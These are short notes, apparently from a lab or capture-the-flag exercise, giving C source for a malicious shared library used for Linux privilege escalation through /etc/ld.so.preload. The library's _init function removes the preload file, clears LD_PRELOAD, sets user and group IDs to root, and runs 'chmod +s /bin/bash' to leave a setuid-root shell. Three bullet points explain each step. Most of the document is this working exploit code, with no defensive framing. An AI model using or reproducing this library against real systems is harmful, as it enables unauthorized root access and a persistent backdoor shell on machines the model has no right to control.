Explanation of attack vector in physical notes

## Malicious Library:


```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    // Prevent recursion
    unlink("/etc/ld.so.preload");
    
    // Prevent further recursion into preload
    unsetenv("LD_PRELOAD");  
    
    // Set user/group id as root (0)
    setgid(0);
    setuid(0);
    
    // Suid
    system("chmod +s /bin/bash");
}
```
 - Prevent the library from being recursively loaded into new processes spawned after the library has been loaded
 - Unsetting LD_PRELOAD further ensures that subsequent executions of programs don't attempt to preload this library again
 - Use the `system()` call to execute a shell command that sets the setuid bit on `/bin/bash`
